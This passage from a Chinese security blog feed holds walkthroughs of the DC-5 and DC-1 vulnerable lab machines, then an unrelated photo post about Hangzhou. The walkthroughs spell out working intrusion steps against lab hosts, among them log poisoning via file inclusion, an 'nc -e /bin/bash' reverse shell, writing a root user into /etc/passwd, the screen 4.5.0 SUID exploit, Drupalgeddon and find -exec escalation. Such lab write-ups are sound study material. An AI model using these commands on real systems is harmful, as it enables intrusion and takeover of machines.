-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>首先在kali中使用openssl创建一个用户</p>
-<pre><code class="hljs sh">openssl passwd -1 -salt hacker 123456</code></pre>
-
-<p>将该用户加入到root组中，既可拥有root权限(在反弹的shell中执行该命令)</p>
-<pre><code class="hljs sh">hacker:$1$hacker<span class="hljs-variable">$6luIRwdGpBvXdP</span>.GMwcZp/:0:0::/root:/bin/bash</code></pre>
-
-<p>将该用户的信息写入到<code>/etc/passwd</code>中，就想当于在靶机中创建了一个root用户权限的用户</p>
-<pre><code class="hljs sh">ehco <span class="hljs-string">&#x27;sun:$1$sun$DD5cShz08xZBESgMJhDRY.:0:0::/root:/bin/bash&#x27;</span> &gt;&gt; /etc/passwd</code></pre>
-
-<p>切换用户</p>
-<pre><code class="hljs sh">su hacker</code></pre>
-
-<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220930002110117.png" alt="image-20220930002110117"></p>
-<h2 id="读取flag"><a href="#读取flag" class="headerlink" title="读取flag"></a>读取flag</h2><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220929122622040.png" alt="image-20220929122622040"></p>
-<h1 id="DC-5"><a href="#DC-5" class="headerlink" title="DC-5"></a>DC-5</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>运行虚拟机后，将kali与靶机配置到同一网卡下即可</p>
-<p>kali的ip地址：<code>192.168.56.101</code></p>
-<h2 id="网络嗅探-1"><a href="#网络嗅探-1" class="headerlink" title="网络嗅探"></a>网络嗅探</h2><p>在kali中使用netdiscover发现当前网络中存活的主机</p>
-<pre><code class="hljs sh">netdiscover -i eth0</code></pre>
-
-<p>探测到靶机的ip地址为：<code>192.168.56.102</code></p>
-<p>再使用nmap扫描开放的服务端口</p>
-<pre><code class="hljs sh">nmap -sS -sV -A -n 192.168.56.102</code></pre>
-
-<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220930163714244.png" alt="image-20220930163714244"></p>
-<p>可以看到靶机的80端口是开启的，直接访问。</p>
-<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>网页中存在一个留言板<code>http://192.168.220.139/contact.php</code></p>
-<p>提交留言信息会跳转到<code>http://192.168.56.102/thankyou.php?firstname=1&amp;lastname=1&amp;country=australia&amp;subject=1</code></p>
-<p>此时再次刷新页面，会发现右下角的copyright会发生变化</p>
-<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220930164227501.png" alt="image-20220930164227501"></p>
-<p>首先使用dirb 去探测网站中的所有url，但是效果不好只能探测到index.php</p>
-<p>那么就用bp的intruder模块加载自己的字典进行路劲爆破，最后爆破结果如下</p>
-<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220930172927445.png" alt="image-20220930172927445"></p>
-<p>这里的footer是网页源码中没有暴露的页面。</p>
-<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220930173042421.png" alt="image-20220930173042421"></p>
-<p>由于footer.php的内容可以显示子再thankyou.php中，那么thankyou.php一定是包含了footer.php，那么下面的要找出thankyou.php包含文件的参数是什么</p>
-<p>尝试</p>
-<pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.102</span>/thankyou.php?page=footer.php
-http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.102</span>/thankyou.php?file=footer.php</code></pre>
-
-<p>发现以上两个参数都可以正常访问</p>
-<p>接下来就是尝试文件包含漏洞</p>
-<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>上面已经发现页面存在文件包含，很直观的想法就是看能否将<code>/etc/passwd</code>读取到</p>
-<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220930232717029.png" alt="image-20220930232717029"></p>
-<pre><code class="hljs ruby"><span class="hljs-symbol">root:</span><span class="hljs-symbol">x:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:root</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/bin/bash</span> <span class="hljs-symbol">daemon:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">:daemon</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">bin:</span><span class="hljs-symbol">x:</span><span class="hljs-number">2</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">:bin</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">sys:</span><span class="hljs-symbol">x:</span><span class="hljs-number">3</span><span class="hljs-symbol">:</span><span class="hljs-number">3</span><span class="hljs-symbol">:sys</span><span class="hljs-symbol">:/dev</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">sync:</span><span class="hljs-symbol">x:</span><span class="hljs-number">4</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:sync</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/bin/sync</span> <span class="hljs-symbol">games:</span><span class="hljs-symbol">x:</span><span class="hljs-number">5</span><span class="hljs-symbol">:</span><span class="hljs-number">60</span><span class="hljs-symbol">:games</span><span class="hljs-symbol">:/usr/games</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">man:</span><span class="hljs-symbol">x:</span><span class="hljs-number">6</span><span class="hljs-symbol">:</span><span class="hljs-number">12</span><span class="hljs-symbol">:man</span><span class="hljs-symbol">:/var/cache/man</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">lp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">7</span><span class="hljs-symbol">:</span><span class="hljs-number">7</span><span class="hljs-symbol">:lp</span><span class="hljs-symbol">:/var/spool/lpd</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">mail:</span><span class="hljs-symbol">x:</span><span class="hljs-number">8</span><span class="hljs-symbol">:</span><span class="hljs-number">8</span><span class="hljs-symbol">:mail</span><span class="hljs-symbol">:/var/mail</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">news:</span><span class="hljs-symbol">x:</span><span class="hljs-number">9</span><span class="hljs-symbol">:</span><span class="hljs-number">9</span><span class="hljs-symbol">:news</span><span class="hljs-symbol">:/var/spool/news</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">uucp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">10</span><span class="hljs-symbol">:uucp</span><span class="hljs-symbol">:/var/spool/uucp</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">proxy:</span><span class="hljs-symbol">x:</span><span class="hljs-number">13</span><span class="hljs-symbol">:</span><span class="hljs-number">13</span><span class="hljs-symbol">:proxy</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span> www-<span class="hljs-symbol">data:</span><span class="hljs-symbol">x:</span><span class="hljs-number">33</span><span class="hljs-symbol">:</span><span class="hljs-number">33</span><span class="hljs-symbol">:www-data</span><span class="hljs-symbol">:/var/www</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">backup:</span><span class="hljs-symbol">x:</span><span class="hljs-number">34</span><span class="hljs-symbol">:</span><span class="hljs-number">34</span><span class="hljs-symbol">:backup</span><span class="hljs-symbol">:/var/backups</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">list:</span><span class="hljs-symbol">x:</span><span class="hljs-number">38</span><span class="hljs-symbol">:</span><span class="hljs-number">38</span><span class="hljs-symbol">:Mailing</span> List <span class="hljs-symbol">Manager:</span>/var/<span class="hljs-symbol">list:</span>/usr/sbin/nologin <span class="hljs-symbol">irc:</span><span class="hljs-symbol">x:</span><span class="hljs-number">39</span><span class="hljs-symbol">:</span><span class="hljs-number">39</span><span class="hljs-symbol">:ircd</span><span class="hljs-symbol">:/var/run/ircd</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">gnats:</span><span class="hljs-symbol">x:</span><span class="hljs-number">41</span><span class="hljs-symbol">:</span><span class="hljs-number">41</span><span class="hljs-symbol">:Gnats</span> Bug-Reporting System (admin)<span class="hljs-symbol">:/var/lib/gnats</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">nobody:</span><span class="hljs-symbol">x:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:nobody</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/usr/sbin/nologin</span> systemd-<span class="hljs-symbol">timesync:</span><span class="hljs-symbol">x:</span><span class="hljs-number">100</span><span class="hljs-symbol">:</span><span class="hljs-number">103</span><span class="hljs-symbol">:systemd</span> Time Synchronization,,,<span class="hljs-symbol">:/run/systemd</span><span class="hljs-symbol">:/bin/false</span> systemd-<span class="hljs-symbol">network:</span><span class="hljs-symbol">x:</span><span class="hljs-number">101</span><span class="hljs-symbol">:</span><span class="hljs-number">104</span><span class="hljs-symbol">:systemd</span> Network Management,,,<span class="hljs-symbol">:/run/systemd/netif</span><span class="hljs-symbol">:/bin/false</span> systemd-<span class="hljs-symbol">resolve:</span><span class="hljs-symbol">x:</span><span class="hljs-number">102</span><span class="hljs-symbol">:</span><span class="hljs-number">105</span><span class="hljs-symbol">:systemd</span> Resolver,,,<span class="hljs-symbol">:/run/systemd/resolve</span><span class="hljs-symbol">:/bin/false</span> systemd-bus-<span class="hljs-symbol">proxy:</span><span class="hljs-symbol">x:</span><span class="hljs-number">103</span><span class="hljs-symbol">:</span><span class="hljs-number">106</span><span class="hljs-symbol">:systemd</span> Bus Proxy,,,<span class="hljs-symbol">:/run/systemd</span><span class="hljs-symbol">:/bin/false</span> Debian-<span class="hljs-symbol">exim:</span><span class="hljs-symbol">x:</span><span class="hljs-number">104</span><span class="hljs-symbol">:</span><span class="hljs-number">109</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/spool/exim4</span><span class="hljs-symbol">:/bin/false</span> <span class="hljs-symbol">messagebus:</span><span class="hljs-symbol">x:</span><span class="hljs-number">105</span><span class="hljs-symbol">:</span><span class="hljs-number">110</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/run/dbus</span><span class="hljs-symbol">:/bin/false</span> <span class="hljs-symbol">statd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">106</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/lib/nfs</span><span class="hljs-symbol">:/bin/false</span> <span class="hljs-symbol">sshd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">107</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/run/sshd</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">dc:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:dc</span>,,,<span class="hljs-symbol">:/home/dc</span><span class="hljs-symbol">:/bin/bash</span> <span class="hljs-symbol">mysql:</span><span class="hljs-symbol">x:</span><span class="hljs-number">108</span><span class="hljs-symbol">:</span><span class="hljs-number">113</span><span class="hljs-symbol">:MySQL</span> Server,,,<span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/bin/false</span></code></pre>
-
-
-
-<p>从http的响应头可以看到网站使用的中间件是nginx，那么可尝试获取去nginx的日志文件，默认绝对路径为<code>/var/log/nginx/access.log</code></p>
-<p>使用url<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221001160016500.png" alt="image-20221001160016500"></p>
-<p>这里一定得要用bp，不然会由于浏览器的自动编码导致失效</p>
-<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221001105755300.png" alt="image-20221001105755300"></p>
-<p>能够发现刚才的访问记录已经被写入到了日志文件中</p>
-<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220930234744268.png" alt="image-20220930234744268"></p>
-<p><strong>PHP中造成文件包含的四个函数</strong></p>
-<blockquote>
-<p><strong>1、include() 、require()</strong></p>
-<p><strong>当使用include()函数包含文件时，只有代码执行到 include() 函数时才将文件包含进来，发生错误时只给出一个警告，继续向下执行。</strong></p>
-<p><strong>当使用require()函数包含文件时，只要程序一执行就会立即调用文件,发生错误的时候会输出错误信息，并且终止脚本的运行</strong></p>
-<p><strong>2、include_once() 功能和 include() 相同，区别在于当重复调用同一文件时，程序只调用一次。</strong></p>
-<p><strong>require_once()功能和require()相同，区别在于当重复调用同一文件时，程序只调用一次。</strong></p>
-<p>​       <strong>当使用上述四个函数包含一个新文件时，该文件将作为 PHP 代码执行，php 内核并不在意该被包含的文件是什么类型。所以如果被包含的是 txt 文件、图片文件、远程 url、也都将作为 PHP 代码执行。</strong></p>
-</blockquote>
-<p>一句话木马上传成功后，就可以使用蚁剑连接了</p>
-<pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.102</span><span class="hljs-regexp">/thankyou.php?file=/</span>var<span class="hljs-regexp">/log/</span>nginx/access.log
-密码：<span class="hljs-number">666</span></code></pre>
-
-<h2 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h2><p>再kali中监听4444端口</p>
-<pre><code class="hljs sh">nc -lvvp 4444</code></pre>
-
-<p>再蚁剑的终端中执行</p>
-<pre><code class="hljs sh">nc  -e  /bin/bash  192.168.56.101 4444</code></pre>
-
-<p>此时已经获取shell</p>
-<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221001113341268.png" alt="image-20221001113341268"></p>
-<p>使用python的反弹shell</p>
-<pre><code class="hljs sh">python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></code></pre>
-
-<h2 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h2><p>使用find命令，查找具有suid权限的命令，发现screen-4.5.0</p>
-<pre><code class="hljs sh">find / -perm /4000 2 &gt; /dev/null</code></pre>
-
-<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221001113542405.png" alt="image-20221001113542405"></p>
-<p>那么就可以查找可用于screen 4.5.0的漏洞脚本文件，再kali中查找</p>
-<pre><code class="hljs sh">searchsploit screen 4.5.0</code></pre>
-
-<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221001113845331.png" alt="image-20221001113845331"></p>
-<p>将脚本拷贝到当前工作目录</p>
-<pre><code class="hljs sh">cp /usr/share/exploitdb/exploits/linux/<span class="hljs-built_in">local</span>/41154.sh  41154.sh
-
-cp /usr/share/exploitdb/exploits/linux/<span class="hljs-built_in">local</span>/41152.txt  41152.txt</code></pre>
-
-<p>尝试从蚁剑上传到网站的根目录，但是发现权限不够，最后再/tmp目录上传成功</p>
-<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221001120350730.png" alt="image-20221001120350730"></p>
-<p>加上可执行权限即可</p>
-<pre><code class="hljs sh">chmod +x 41154.sh</code></pre>
-
-<p>在kali中的shell执行</p>
-<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221001120551421.png" alt="image-20221001120551421"></p>
-<h2 id="获得flag"><a href="#获得flag" class="headerlink" title="获得flag"></a>获得flag</h2><p>进入root目录即可获取到flag</p>
-<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221001120217058.png" alt="image-20221001120217058"></p>
-<h1 id="DC1"><a href="#DC1" class="headerlink" title="DC1"></a>DC1</h1><h2 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>将靶机与kali放在同一网卡下实现相互通信即可</p>
-<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>使用</p>
-<pre><code class="hljs sh">arp-scan -l
-netdiscover -eth0</code></pre>
-
-<p>发现目标靶机的ip地址为<code>192.168.56.103</code></p>
-<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005124337784.png" alt="image-20221005124337784"></p>
-<p>直接方位该ip地址，发现是可访问的网站，但是需要密码无法进入</p>
-<p>但是很明显可以看出此网站使用的CMS为Drupal,那么就寻找与该CMS存在的漏洞即可</p>
-<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005125020123.png" alt="image-20221005125020123"></p>
-<p>可以看到关于drupal 的漏洞有七个，但是我们需要选择最新的且等级为excellent的</p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>这里使用的是<code>exploit/multi/http/drupal_drupageddon</code></p>
-<pre><code class="hljs sh">use exploit/multi/http/drupal_drupageddon
-<span class="hljs-built_in">set</span> RHOSTS 192.168.56.103
-<span class="hljs-built_in">set</span> LHOST 192.168.56.101
-run</code></pre>
-
-<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005130958089.png" alt="image-20221005130958089"></p>
-<p>网站的根目录中存在一个flag1.txt，其中提示</p>
-<pre><code class="hljs gradle"><span class="hljs-keyword">Every</span> good CMS needs a config <span class="hljs-keyword">file</span> - and so <span class="hljs-keyword">do</span> you.</code></pre>
-
-<p>那么就是找cms的配置文件，而drupal的默认配置文件位置 <code>/var/www/sites/default/settings.php</code></p>
-<p>查看此配置文件，可以看到mysql数据库的账号密码</p>
-<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005131437953.png" alt="image-20221005131437953"></p>
-<p>并且出现了flag2</p>
-<blockquote>
-<p>翻译:蛮力和字典攻击不行，唯一方法是获得访问权限(你将需要访问的)。你能用这些凭证做什么?</p>
-</blockquote>
-<h2 id="交互式shell"><a href="#交互式shell" class="headerlink" title="交互式shell"></a>交互式shell</h2><p>在msfconsole中获取shell后使用执行下面这句话</p>
-<pre><code class="hljs sh">python -c <span class="hljs-string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span>
-连接数据库
-
-mysql -udbuser -p</code></pre>
-
-<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005133337362.png" alt="image-20221005133337362"></p>
-<p>密码是加密后保存到数据库的。但是在<code>/var/www/script</code>中发现了将密码转换为hash的脚本，可以使用脚本生成自己的密码的hash然后保存到数据库中，可惜的是该标本的环境存在问题，无法运行</p>
-<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005134059498.png" alt="image-20221005134059498"></p>
-<p>百度以下<code>drupal 密码</code>相关的问题，发现有重置admin密码的方法</p>
-<blockquote>
-<p>password的SHA-512加密运算的结果“$S$CDbdwZvjHQ09IVRs88G0fnaxPr50/kb81YI9.8M/D9okW7J/s5U4”；</p>
-</blockquote>
-<p>那么就是在数据库中更新admin的密码即可</p>
-<pre><code class="hljs mysql">update users set pass &#x3D; &#39;$S$CDbdwZvjHQ09IVRs88G0fnaxPr50&#x2F;kb81YI9.8M&#x2F;D9okW7J&#x2F;s5U4&#39; where name &#x3D; &#39;admin&#39;;</code></pre>
-
-<p>登录后在网站中发现了flag3</p>
-<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005135247304.png" alt="image-20221005135247304"></p>
-<blockquote>
-<p>特殊的PERMS将帮助查找passwd -但您需要-exec该命令来找出如何获取阴影中的内容。</p>
-</blockquote>
-<p>在<code>home/flag4</code>中看到flag4</p>
-<blockquote>
-<p>Can you use this same method to find or access the flag in root?</p>
-<p>Probably. But perhaps it’s not that easy.  Or maybe it is?</p>
-<p>您可以使用相同的方法在根目录中查找或访问标志吗?</p>
-<p>可能。但也许并没有那么容易。也许是这样?</p>
-</blockquote>
-<p><strong>使用CVE2014-3704添加管理账号</strong></p>
-<p>在exploit-db中有可以直接利用的EXP，可以直接添加管理账号<br>地址：<a href="https://www.exploit-db.com/exploits/34992">https://www.exploit-db.com/exploits/34992</a></p>
-<p>在kali中开启web服务，然后再靶机中下载该exp</p>
-<pre><code class="hljs apache"><span class="hljs-attribute">python3</span> -m http.server <span class="hljs-number">80</span></code></pre>
-
-<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005142802768.png" alt="image-20221005142802768"></p>
-<pre><code class="hljs awk">靶机端下载
-wget http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.101</span>/<span class="hljs-number">34992</span>.py
-靶机端运行
-python <span class="hljs-number">34992</span>.py -t http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.103</span>/ -u hack -p root</code></pre>
-
-<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005143232685.png" alt="image-20221005143232685"></p>
-<p>直接使用hack 登录</p>
-<h2 id="提权-2"><a href="#提权-2" class="headerlink" title="提权"></a>提权</h2><p>使用find找下具有root权限的suid</p>
-<pre><code class="hljs sh">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null
-find / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/null  <span class="hljs-comment"># 这句也可以</span></code></pre>
-
-<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005135623191.png" alt="image-20221005135623191"></p>
-<p>可以发现find命令可以用来提权</p>
-<p>尝试使用find执行命令</p>
-<pre><code class="hljs sh">find / -name flag4 -<span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;whoami&quot;</span> \; <span class="hljs-comment"># 注意这里的-name 后的参数需要是存在的文件</span></code></pre>
-
-<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005141313251.png" alt="image-20221005141313251"></p>
-<p>这里执行的结果可以看出find是可以提权的</p>
-<h2 id="获取flag"><a href="#获取flag" class="headerlink" title="获取flag"></a>获取flag</h2><p>直接使用执行 <code>/bin/sh</code></p>
-<pre><code class="hljs sh">find / -name flag4 -<span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;/bin/sh&quot;</span> \;</code></pre>
-
-<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005141539383.png" alt="image-20221005141539383"></p>
-]]></content>
-      <tags>
-        <tag>渗透测试</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>半年杭州体验卡即将到期</title>
-    <url>/2022/12/07/vblog1/</url>
-    <content><![CDATA[<h1 id="杭州半年体验卡"><a href="#杭州半年体验卡" class="headerlink" title="杭州半年体验卡"></a>杭州半年体验卡</h1><p>本来以为一个学期会很慢，但是现在发现时间过得好快。</p>
-<p>四个月来拍了很多照片，在这里做个总结。</p>
-<h2 id="关于杭研"><a href="#关于杭研" class="headerlink" title="关于杭研"></a>关于杭研</h2><table>
-<thead>
-<tr>
-<th><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220909_125413767_iOS.jpg" alt="20220909_125413767_iOS"></th>
-<th><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220910_142137039_iOS.jpg" alt="20220910_142137039_iOS"></th>
-</tr>
-</thead>
-<tbody><tr>
-<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207111228259.png" alt="image-20221207111228259"></td>
-<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207111355531.png" alt="image-20221207111355531"></td>
-</tr>
-<tr>
-<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20221130_094731139_iOS.jpg" alt="20221130_094731139_iOS"></td>
-<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20221112_092918159_iOS.jpg" alt="20221112_092918159_iOS"></td>
-</tr>
-</tbody></table>
-<h2 id="关于西湖"><a href="#关于西湖" class="headerlink" title="关于西湖"></a>关于西湖</h2><table>
-<thead>
-<tr>
-<th><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220910_090838376_iOS.jpg" alt="20220910_090838376_iOS"></th>
-<th><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220910_091601507_iOS.jpg" alt="20220910_091601507_iOS"></th>
-<th><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220910_092605365_iOS.jpg" alt="20220910_092605365_iOS"></th>
-</tr>
-</thead>
-<tbody><tr>
-<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220910_093711007_iOS.jpg" alt="20220910_093711007_iOS"></td>
-<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220910_095123680_iOS.jpg" alt="20220910_095123680_iOS"></td>
-<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220910_095545635_iOS.jpg" alt="20220910_095545635_iOS"></td>
-</tr>
-<tr>
-<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220910_091850580_iOS.jpg" alt="20220910_091850580_iOS"></td>
-<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220910_095521961_iOS.jpg" alt="20220910_095521961_iOS"></td>
-<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220910_101905976_iOS.jpg" alt="20220910_101905976_iOS"></td>
-</tr>
-<tr>
-<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20221127_092047692_iOS.jpg" alt="20221127_092047692_iOS"></td>
-<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20221127_092218929_iOS.jpg" alt="20221127_092218929_iOS"></td>
-<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20221127_092607734_iOS.jpg" alt="20221127_092607734_iOS"></td>
-</tr>
-</tbody></table>
-<h2 id="关于绍兴"><a href="#关于绍兴" class="headerlink" title="关于绍兴"></a>关于绍兴</h2><table>
-<thead>
-<tr>
-<th><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207111836034.png" alt="image-20221207111836034"></th>
-<th><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207111857720.png" alt="image-20221207111857720"></th>
-<th align="center"><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207111920504.png" alt></th>
-</tr>
-</thead>
-<tbody><tr>
-<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207111905422.png" alt="image-20221207111905422"></td>
-<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207112733073.png" alt="image-20221207112733073"></td>
-<td align="center"><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207112652542.png" alt="image-20221207112652542"></td>
-</tr>
-<tr>
-<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207112051468.png" alt="image-20221207112051468"></td>
-<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20221004_033920832_iOS.jpg" alt></td>
-<td align="center"><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207111929931.png" alt></td>
-</tr>
-</tbody></table>
-<h2 id="关于杭州"><a href="#关于杭州" class="headerlink" title="关于杭州"></a>关于杭州</h2><p>….</p>
-<table>
-<thead>
-<tr>
-<th><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207114150650.png" alt="image-20221207114150650"></th>
-<th align="center"><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207113619574.png" alt="image-20221207113619574"></th>
-<th><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20221003_042522512_iOS.jpg" alt></th>
-</tr>
-</thead>
-<tbody><tr>
-<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207113814788.png" alt="image-20221207113814788"></td>
-<td align="center"><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207113919110.png" alt="image-20221207113919110"></td>
-<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207114011453.png" alt="image-20221207114011453"></td>
-</tr>
-<tr>
-<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207114342399.png" alt="image-20221207114304031"></td>
-<td align="center"><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207114240111.png" alt="image-20221207114240111"></td>
-<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207114408016.png" alt="image-20221207114408016"></td>
-</tr>
-</tbody></table>
-<h2 id="关于🌇"><a href="#关于🌇" class="headerlink" title="关于🌇"></a>关于🌇</h2><table>
-<thead>
-<tr>
-<th><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220916_100338097_iOS.jpg" alt></th>
-<th><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20221112_092603320_iOS.jpg" alt="20221112_092603320_iOS"></th>
-<th><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220621_110111436_iOS.jpg" alt></th>
-</tr>
-</thead>
-<tbody><tr>
-<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207144624211.png" alt="image-20221207144624211"></td>
-<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220916_100927998_iOS.jpg" alt></td>
